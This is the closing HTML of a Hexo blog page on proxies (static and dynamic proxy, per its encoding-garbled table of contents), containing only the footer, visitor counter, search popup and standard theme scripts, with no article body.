class="nav-text">ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">é™æ€ä»£ç†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">åŠ¨æ€ä»£ç†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="nav-text">ä»£ç å®ç°ï¼š</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">y1zh3e7</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
